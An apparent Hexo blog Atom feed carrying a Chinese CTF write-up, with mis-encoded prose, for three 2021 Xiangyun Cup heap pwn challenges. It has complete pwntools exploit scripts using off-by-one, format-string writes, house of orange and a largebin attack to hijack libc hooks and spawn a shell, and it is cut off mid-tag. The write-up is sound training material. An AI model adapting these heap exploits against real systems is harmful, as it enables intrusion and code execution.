<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title></title>
  
  
  <link href="https://brooke-hub.github.io/atom.xml" rel="self"/>
  
  <link href="https://brooke-hub.github.io/"/>
  <updated>2021-09-20T13:23:00.992Z</updated>
  <id>https://brooke-hub.github.io/</id>
  
  <author>
    <name>WendyJellyBeans</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021ç¥¥äº‘æ¯pwn_wp</title>
    <link href="https://brooke-hub.github.io/2021/09/20/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/"/>
    <id>https://brooke-hub.github.io/2021/09/20/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/</id>
    <published>2021-09-20T00:58:21.000Z</published>
    <updated>2021-09-20T13:23:00.992Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>åˆæ˜¯æ‹–äº†å¥½ä¹…çš„å¤ç°ï¼Œç¥¥pwnæ¯ğŸ˜…</p></blockquote><span id="more"></span><h1 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a><strong>PassWordBox_FreeVersion</strong></h1><p>off by one</p><p>å°±æ˜¯æ•°æ®ä¼šè¢«å¼‚æˆ–åŠ å¯†ï¼Œä½†æ˜¯å¼‚æˆ–ç»“æœå¯ä»¥è¢«æ³„éœ²ä»è€Œç®—å‡ºå¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwdFree&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/wendy/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;119.3.81.43&#x27;</span>, <span class="number">49153</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,pwd</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;t Save:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(size)) <span class="comment">#&lt;=0x100</span></span><br><span class="line">    sla(<span class="string">&#x27;Your Pwd:&#x27;</span>,pwd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,pwd</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index))</span><br><span class="line">    sd(pwd)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Want Check:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;2 Delete:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">xor = (u64(sh.recv(<span class="number">8</span>)))^<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;xor&#x27;</span>,xor)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x88</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    add(i,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64((<span class="number">0x100</span>+<span class="number">0x90</span>+<span class="number">0x90</span>)^xor)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">12</span>): <span class="comment">#5-11</span></span><br><span class="line">    add(i,<span class="number">0xf0</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xF0</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libc_base = ((u64(sh.recv(<span class="number">8</span>)))^xor) - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;b\n&#x27;</span>) <span class="comment">#12==1</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x88</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x88</span>) </span><br><span class="line">add(<span class="number">14</span>,<span class="number">0xF0</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0xF0</span>) </span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">12</span>,p64(__free_hook))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x80</span>,p64((<span class="number">0x4f432</span>+libc_base)^xor)+<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#0x4f3d5 0x4f432 0x10a41c</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>scanfçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯ä»¥æ— é™ä»»æ„åœ°å€å†™</p><p>æ²¡æœ‰deleåŠŸèƒ½ï¼Œä½¿ç”¨house of orange</p><p>æœ‰äº†å †åœ°å€ï¼Œç”¨ä»»æ„å†™åŠŸèƒ½æ”¹å°top chunk sizeï¼ˆæ³¨æ„è¦å¯¹é½ï¼‰</p><p>è®©top chunkè¢«é‡Šæ”¾åˆ°unsortedbinï¼Œå†ç”³è¯·å‡ºæ¥æ³„éœ²libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./note&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/wendy/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;47.104.70.90&#x27;</span>, <span class="number">25315</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span>():</span></span><br><span class="line">    <span class="keyword">global</span> libc_base,__malloc_hook,__free_hook,system,binsh_addr,_IO_2_1_stdout_,_IO_list_all,realloc</span><br><span class="line">    libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4c48</span></span><br><span class="line">    success(<span class="string">&#x27;libc_base = &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">    __malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    realloc=libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">   sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">   cmd(<span class="number">1</span>)</span><br><span class="line">   sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size)) <span class="comment">#&lt;=0x100</span></span><br><span class="line">   sa(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">fmt,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;say ? &#x27;</span>,fmt)</span><br><span class="line">    sla(<span class="string">&#x27;? &#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;addr: 0x&#x27;</span>)</span><br><span class="line">chunk_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) -<span class="number">0x10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>-<span class="number">2</span>): <span class="comment"># align top chunk size</span></span><br><span class="line">    add(<span class="number">0xf0</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">leak(<span class="string">&#x27;chunk_addr&#x27;</span>,chunk_addr)</span><br><span class="line">top_chunk=chunk_addr+<span class="number">0xf00</span></span><br><span class="line">leak(<span class="string">&#x27;top_chunk&#x27;</span>,top_chunk)</span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(top_chunk+<span class="number">8</span>),p64(<span class="number">0x101</span>)) <span class="comment"># top size 0x20101 -&gt; 0x101</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;bbbb\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">leaklibc()</span><br><span class="line"></span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">say(<span class="string">&quot;%7$s&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(__malloc_hook-<span class="number">8</span>),p64(one[<span class="number">1</span>]+libc_base)+p64(realloc+<span class="number">13</span>)) </span><br><span class="line"></span><br><span class="line">leak(<span class="string">&#x27;realloc+13&#x27;</span>,realloc+<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="PassWordBox-ProVersion"><a href="#PassWordBox-ProVersion" class="headerlink" title="PassWordBox_ProVersion"></a><strong>PassWordBox_ProVersion</strong></h1><p>åŠ å¯†éƒ¨åˆ†è¿˜æ˜¯å’Œç¬¬ä¸€é¢˜ä¸€æ ·ï¼ŒxoråŠ å¯†æ•°å­—å›ºå®šï¼Œåˆ©ç”¨0^num=numå¯ä»¥æ³„éœ²å‡ºnum</p><p>å¯ä»¥UAFï¼Œä½†æ˜¯å› ä¸ºchunkå¤§å°é™åˆ¶ä¸èƒ½ç›´æ¥tcacheåŠ«æŒ</p><p>å¯ä»¥é€šè¿‡largebin attackå¾€mp_.tcache_binså†™ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼ˆå †åœ°å€ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠlargechunkæ”¾å…¥tcachebinäº†</p><p><img src="/2021/09/20/2021%E7%A5%A5%E4%BA%91%E6%9D%AFpwn-wp/image-20210920183216925.png" alt="image-20210920183216925"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwdPro&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/wendy/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;47.104.70.90&#x27;</span>, <span class="number">25315</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">index</span>):</span></span><br><span class="line">   sla(<span class="string">&#x27;Input Your Choice:\n&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,ID,Length,content</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which PwdBox You Want Add:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;Input The ID You Want Save:&#x27;</span>,ID)</span><br><span class="line">    sla(<span class="string">&#x27;Length Of Your Pwd:&#x27;</span>,<span class="built_in">str</span>(Length)) <span class="comment">#0x41f-0x888</span></span><br><span class="line">    sa(<span class="string">&#x27;Your Pwd:&#x27;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;You Want Edit:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which PwdBox You Want Check:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx you want 2 Delete:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Idx you want 2 Recover:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x628</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Save ID:&#x27;</span>)</span><br><span class="line">secret_xor = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">leak(<span class="string">&#x27;secret_xor&#x27;</span>,secret_xor)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x420</span>,<span class="string">&#x27;b\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x618</span>,<span class="string">&#x27;b\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x420</span>,<span class="string">&#x27;b\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x500</span>,<span class="string">&#x27;b\n&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x500</span>,<span class="string">&#x27;b\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>) <span class="comment"># into unsortedbin</span></span><br><span class="line">recover(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Pwd is: &#x27;</span>)</span><br><span class="line">libc_base = (u64(sh.recv(<span class="number">8</span>)) ^ secret_xor) - <span class="number">0x1ebbe0</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">__free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x638</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#0x630 chunk0 into largebin</span></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#0x620 chunk2 into unsortedbin</span></span><br><span class="line">mp_bins = libc_base+<span class="number">0x1eb280</span>+<span class="number">0x50</span>-<span class="number">0x20</span></span><br><span class="line">leak(<span class="string">&#x27;mp_bins&#x27;</span>,mp_bins)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mp_bins)) <span class="comment"># uaf edit largechunk0(0x630)</span></span><br><span class="line">add(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x638</span>,p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># chunk2 into largebin --&gt; largbin attack!</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">recover(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(__free_hook)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x500</span>,<span class="string">&#x27;c\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">0x500</span>,p64(system^secret_xor)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">ti()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="lemon"><a href="#lemon" class="headerlink" 